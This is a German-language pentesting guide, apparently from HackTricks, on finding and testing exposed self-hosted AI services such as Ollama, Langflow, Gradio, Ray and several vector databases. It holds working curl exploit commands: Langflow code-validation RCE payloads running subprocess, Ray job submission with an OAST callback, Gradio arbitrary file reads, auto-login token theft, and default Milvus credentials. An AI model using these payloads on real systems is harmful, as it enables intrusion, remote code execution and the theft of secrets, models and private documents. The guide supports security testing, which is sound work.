# Offen zugängliche, selbst gehostete AI-Dienste

{{#include ../banners/hacktricks-training.md}}

Teams, die AI-Funktionen entwickeln, betreiben oft eigene Model Runner, Agent Builder, Demo-UIs, Compute-Cluster und Vektordatenbanken. Viele dieser Tools wurden für einen Laptop oder ein abgeschlossenes Labornetzwerk entwickelt. Daher haben sie **standardmäßig keine Authentifizierung** oder werden mit aktiviertem Authentifizierungs-Shortcut ausgeliefert. Wenn ein Angreifer einen solchen Dienst erreichen kann, fällt die Auswirkung meist in eine dieser Kategorien:

- Kostenlose Nutzung von GPUs und Modellen sowie Diebstahl privater Modelle.
- Leak von Prompts, Dokumenten und Embeddings.
- Leak von Secrets aus der Prozessumgebung (LLM-Provider-Keys, Cloud-Credentials).
- Codeausführung, da einige dieser APIs Code **als Funktion** ausführen.

Auf dieser Seite wird beschrieben, wie du diese Dienste findest und was du bei den einzelnen API-Typen testen solltest. Informationen zum Härten eines selbst gehosteten Inference Servers und zum llama.cpp-`/slots`-Leak findest du unter [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Informationen zu schädlichen Model-Dateien findest du unter [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Sende diese Requests ohne Credentials. Eine JSON-Antwort mit den erwarteten Feldern identifiziert das Produkt und oft auch die Version, anhand derer sich erkennen lässt, welche der folgenden Prüfungen relevant sind. Bei den Ports handelt es sich um die dokumentierten Standardwerte oder die in offiziellen Run-Beispielen verwendeten Ports.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Produkt | Häufiger Port | Nicht authentifizierter Request | Erkennungsmerkmale |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | Versions-JSON, Liste lokaler Modelle |
| Langflow | 7860 | `GET /api/v1/version` | Langflow-Versions-JSON |
| Gradio | 7860 | `GET /config` | App-Konfiguration mit Gradio-Version und Component-IDs |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, Liste eingereichter Jobs |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat-Wert, Chroma-Version |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant-Version, Liste der Collections |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate-Version, Klassen |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Liste der Collections oder Authentifizierungsfehler |

Diese Dienste werden auch häufig hinter einem Reverse Proxy unter einem Pfadpräfix veröffentlicht (zum Beispiel `/ollama/` oder `/ray/`). Wiederhole daher die Requests unter jedem Präfix, das du in JavaScript-Bundles oder API-Dokumentationen findest.

## Nicht authentifizierte Inference- und Model-Management-APIs

Model Runner stellen meist eine einzige REST-API bereit, die Inference-Routen mit administrativen Routen kombiniert. Ollama ist ein gutes Beispiel dafür. Es verfügt über keine integrierte Authentifizierung und bindet standardmäßig an `127.0.0.1:11434`, während `OLLAMA_HOST` die Bind-Adresse ändert.<sup>[[1]](#references)[[15]](#references)</sup> Das offizielle Docker-Image setzt im Container `OLLAMA_HOST=0.0.0.0:11434`, deklariert `EXPOSE 11434` und enthält keine `USER`-Anweisung. Daher läuft der Server im Container als Root.<sup>[[16]](#references)</sup> `EXPOSE` veröffentlicht den Port nicht auf dem Host, daher hängt die Erreichbarkeit vom Host von der Bereitstellung ab. Die dokumentierten `docker run`-Befehle verwenden `-p 11434:11434`. Docker veröffentlicht eine solche Zuordnung auf allen Host-Schnittstellen, sofern keine Host-IP angegeben ist.<sup>[[17]](#references)[[18]](#references)</sup>

Was die einzelnen Routengruppen einem Angreifer ermöglichen:<sup>[[2]](#references)</sup>

| Routen | Auswirkung ohne Authentifizierung |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Liste lokaler und geladener Modelle, einschließlich privater Custom-Modelle |
| `POST /api/show` | Model-Details, einschließlich Modelfile, Template und **System-Prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Kostenlose Inference auf der Hardware des Opfers |
| `POST /api/pull`, `/api/push` | Den Server veranlassen, von einer vom Angreifer gewählten Registry herunterzuladen oder ein Modell dorthin hochzuladen |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Modelle erstellen, überschreiben oder löschen |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Eine ohne Zugangsdaten zurückgegebene Modellliste beweist bereits die Offenlegung. Benutzerdefinierte Modelle enthalten oft einen internen System-Prompt unter `/api/show`. Ein Pull zu deinem Host beweist, dass der Server Manifeste von vom Angreifer ausgewählten Registries abruft. Ein `/api/push` zu deiner Registry macht aus der Offenlegung Modelldiebstahl. Rufe auf echten Zielen keine Create- oder Delete-Routen auf.

Registry-Pulls sind auch eine Angriffsfläche für Parser, da der Server Blobs anhand von Werten aus dem Remote-Manifest speichert. In Probllama (CVE-2024-37032, in Ollama 0.1.34 behoben) wurde `digest` aus dem Manifest ohne Validierung als Dateiname verwendet. Eine bösartige Registry konnte daher mit `../`-Sequenzen Dateien außerhalb des Blobs-Verzeichnisses schreiben. Ein präpariertes Manifest, dessen Digest auf eine lokale Datei zeigte, leakte diese Datei an die Angreifer-Registry. Wiz erreichte RCE in Docker, wo der Server als root läuft, indem es eine Shared Library schrieb und sie zu `/etc/ld.so.preload` hinzufügte. Anschließend rief Wiz `/api/chat` auf, sodass ein neuer Prozess die Library lud.<sup>[[15]](#references)</sup> Wenn ein Runner von beliebigen Registries pullen kann, prüfe, wie er Manifestfelder in Pfade umwandelt.

## APIs, die absichtlich Code ausführen

Verwandt: [Flowise-Overrides für Workflow-Code pro Request](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise).

### Job-Submission-APIs

Verteilte Compute-Frameworks behandeln Codeausführung als ihre Hauptfunktion. Die Ray Jobs API am Dashboard-Port (8265) akzeptiert einen Shell-Befehl als `entrypoint` und führt ihn im Cluster aus.<sup>[[19]](#references)</sup> Die Oligo-ShadowRay-Recherche berichtet, dass die Jobs API keine Autorisierung hat und das Dashboard an `0.0.0.0` gebunden ist. Die zugehörige CVE-2023-48022 ist umstritten, da Ray davon ausgeht, nur innerhalb eines kontrollierten Netzwerks ausgeführt zu werden.<sup>[[20]](#references)</sup> Ray hat in Version 2.52.0 eine optionale Token-Authentifizierung (`RAY_AUTH_MODE=token`) hinzugefügt. Ray 2.59 aktiviert sie standardmäßig für lokale Cluster, die mit `ray.init()` gestartet werden; `ray start --head` kann ohne verfügbares Token weiterhin unauthentifiziert gestartet werden. Ray dokumentiert eine umfassendere Einführung der standardmäßigen Authentifizierung für Version 2.61. Prüfe daher die bereitgestellte Version und den Startmodus, statt davon auszugehen, dass das Dashboard offen ist.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashboards dieser Art bieten auch Hilfsrouten, die sich bei älteren Versionen zu prüfen lohnen. Vor Ray 2.8.1 rief `/log_proxy?url=` beliebige HTTP(S)-URLs ab (SSRF auf Cloud-Metadaten), und `/api/v0/logs/file` akzeptierte einen beliebigen `filename`-Pfad – beides ohne Authentifizierung.<sup>[[8]](#references)</sup>

### Code-„Validierungs“-Endpunkte, die Funktionsdefinitionen ausführen

Agent-Builder, die benutzerdefinierte Python-Komponenten akzeptieren, „validieren“ den Code manchmal, indem sie ihn mit `ast` parsen und nur die Funktionsdefinitionen mit `exec()` ausführen. Das ist nicht sicher. Python wertet **Dekoratoren und Standardwerte für Argumente bereits beim Definieren der Funktion aus**, sodass dort platzierter Code ausgeführt wird, selbst wenn der Funktionskörper nie ausgeführt wird. Langflows `POST /api/v1/validate/code` funktionierte auf diese Weise und war vor Version 1.3.0 nicht authentifizierungspflichtig (CVE-2025-3248). Wird eine Exception ausgelöst, die die Befehlsausgabe enthält, gibt der Endpunkt diese Ausgabe in der Antwort zurück:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Teste jeden Endpunkt auf dieses Muster, der Benutzercode kompiliert, lintet oder „prüft“, und verwende vorzugsweise einen DNS-Callback als Nachweis.

### Auto-Login- und Default-Superuser-Token-Routen

Single-User-Tools enthalten oft eine Abkürzung, die jeden Besucher als Administrator anmeldet. In Langflow gibt `GET /api/v1/auto_login`, wenn `AUTO_LOGIN` aktiviert ist, Tokens für den Default-Superuser an jeden Aufrufer zurück. Wenn die Option deaktiviert ist, antwortet die Route mit `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 bis 1.10.0 hatte diese Option standardmäßig aktiviert (CVE-2026-9103). In Kombination mit der oben genannten authentifizierten Code-Validierungsroute ermöglicht dies erneut unauthentifizierte RCE (CVE-2026-9198, gemeldet von Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Aktuelle offizielle Release-Pakete und Docker-Images deaktivieren den automatischen Login und erfordern ein Superuser-Passwort, in Entwicklungszweigen bleibt er jedoch aktiviert.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Auch ohne Codeausführung gewährt ein Superuser-Token Zugriff auf jeden Flow und die gespeicherten Provider-Anmeldedaten. Eine verwandte vorausgesetzte Prüfung für automatisierte Tests findest du unter [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Datei-Bereitstellung und RPC-Routen in ML-Demo-UIs

ML-Demo-Frameworks stellen hochgeladene und generierte Dateien über eine generische Route bereit und ermöglichen es dem Frontend, serverseitige Komponenten-Hilfsfunktionen aufzurufen. Gradio stellt dafür `/config`, `/upload` und `/file=<path>` bereit.<sup>[[5]](#references)</sup> Bei ähnlichen Frameworks sollten zwei Muster getestet werden:

- **Traversal aus einem Upload-Unterverzeichnis:** Prüft die Datei-Route lediglich, ob der Pfad innerhalb des temporären Ordners beginnt, lade eine Datei hoch, um ein Unterverzeichnis zu erstellen, und navigiere dann mit `../` oder `%2e%2e%2f` daraus hinaus. Gradio 4.0 bis 4.10 (CVE-2023-51449) war auf diese Weise verwundbar.<sup>[[26]](#references)[[27]](#references)</sup> Sende die Anfrage mit `curl --path-as-is`, damit der Client den Pfad nicht normalisiert.
- **Beliebiger Methodenaufruf:** Ein Endpunkt, der mit Benutzereingaben `getattr(component, fn_name)` aufruft, ermöglicht es dem Angreifer, interne Hilfsfunktionen aufzurufen. Vor Version 4.13.0 tat Gradio dies über `/component_server`. In Version 4.3 bis 4.12 kopierte `move_resource_to_block_cache` beliebige lokale Dateien in den Cache, von wo aus sie über `/file=` heruntergeladen werden konnten. In Version 3.47 bis 3.50.2 ermöglichten andere Hilfsfunktionen das Lesen von Dateien und einen vollständigen SSRF-Lesezugriff.<sup>[[26]](#references)[[28]](#references)</sup> Ein gepatchter Server antwortet mit `Function not found.`, wenn Hilfsfunktionen nicht als Serverfunktionen markiert sind.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Auf Hugging Face Spaces sind Space secrets Umgebungsvariablen, daher ist `/proc/self/environ` die wertvollste Datei. Horizon3 las sie mit einem HTTP-`Range`-Header aus.<sup>[[26]](#references)</sup>

## Von RAG verwendete Vektordatenbanken

RAG speichert Chunks der Originaldokumente, ihre Embeddings und Metadaten in einer Vektordatenbank. Der Assistant fügt dann die besten Treffer in seinen Prompt ein. Lesezugriff leakt daher den **Klartext privater Dokumente**. Schreibzugriff ermöglicht es einem Angreifer, Chunks einzufügen, die später in die Prompts anderer Benutzer übernommen werden. Das ist eine persistente indirekte Prompt Injection (siehe [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Prüfen Sie bei selbst gehosteten Vektordatenbanken, ob eine Authentifizierung eingerichtet oder anonymer Zugriff aktiviert ist:

- **Qdrant**: Selbst bereitgestellte Instanzen lauschen auf allen Schnittstellen und haben standardmäßig keine Authentifizierung. Wenn ein Schlüssel konfiguriert ist, wird er im Header `api-key` oder als `Authorization: Bearer` übermittelt. Es kann schreibgeschützte Schlüssel und Schlüssel für einzelne Collections geben.<sup>[[11]](#references)</sup>
- **Chroma**: Authentifizierung ist standardmäßig deaktiviert. Die Token-Authentifizierung verwendet `Authorization` oder `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: Wenn anonymer Zugriff aktiviert ist, werden Anfragen ohne Zugangsdaten als `user: anonymous` authentifiziert und erhalten alle Berechtigungen dieses Benutzers.<sup>[[30]](#references)</sup>
- **Milvus**: Authentifizierung ist deaktiviert, sofern `common.security.authorizationEnabled` nicht auf `true` gesetzt ist. Ist sie aktiviert, lautet das Passwort des standardmäßigen Benutzers `root` `Milvus`, und das Tokenformat ist `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Eine Antwort mit privaten Daten ohne Zugangsdaten weist auf eine Offenlegung hin. Wenn Authentifizierung aktiviert ist, prüfen Sie separat, ob noch ein unverändertes Standardkonto vorhanden ist:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Prüfe, ob die Payloads Dokumenttexte, Benutzerkennungen oder Tenant-Namen enthalten. Um Schreibzugriff nachzuweisen, ohne Produktionsdaten zu verfälschen, erstelle eine leere, eindeutig benannte Collection und lösche sie sofort wieder – und zwar nur, wenn der Scope dies erlaubt.

Auch bei diesen Servern kann die Authentifizierung zu spät greifen. Im Python-FastAPI-Server von Chroma (1.0.0 bis mindestens 1.5.8, CVE-2026-45829) wurde die vom Client bereitgestellte Embedding-Funktion in der Route zur Collection-Erstellung erstellt, bevor die Authentifizierungsprüfung erfolgte. Eine Konfiguration, die auf ein vom Angreifer kontrolliertes Hugging-Face-Modell mit `trust_remote_code: true` verwies, führte den Code des Angreifers aus, selbst wenn die Anfrage abgelehnt wurde. Das Rust-Frontend war nicht betroffen.<sup>[[32]](#references)</sup> Wenn eine Anfrage eine Modell- oder Plugin-Konfiguration enthält, teste sie ohne Anmeldedaten und achte auf ausgehende Abrufe aus deinem Modell-Repository.

## References

- [1] [Ollama-FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama-API-Dokumentation](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow-README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow-Quellcode – API-v1-Endpunkte](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio-Quellcode – routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio-Quellcode – http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray-Quellcode – job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox – Ray, Versionen 2.6.3 und 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma-Quellcode – Python-Client-Standardeinstellungen](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma-Quellcode – FastAPI-Server-Routen](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant – Sicherheit](https://qdrant.tech/documentation/security/)
- [12] [Qdrant-OpenAPI-Spezifikation](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate-OpenAPI-Spezifikation](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus – Verbindung zum Milvus-Server herstellen](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz – Probllama: Schwachstelle für Remote Code Execution in Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama-Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama-Docker-Dokumentation](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker – Ports veröffentlichen und freigeben](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray-Jobs-REST-API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo – ShadowRay: Erste bekannte Angriffskampagne auf AI-Workloads, die in freier Wildbahn ausgenutzt wurde](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray-Token-Authentifizierung](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai – Unsicher bei jedem Tempo: Missbrauch von Python Exec für unauthentifizierte RCE in Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow-Quellcode – Login-Router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD – CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD – CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai – Ausnutzen von Dateileseschwachstellen in Gradio, um Secrets aus Hugging Face Spaces zu stehlen](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio-Sicherheitshinweis GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio-Fix-Commit für `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook – native Chroma-Authentifizierung](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate – Authentifizierung](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus – Benutzerauthentifizierung](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer – ChromaToast Served Pre-Auth](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBM-Sicherheitsbulletin – Unauthentifizierte Remote Code Execution durch Umgehung der automatischen Anmeldung und Codevalidierung (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
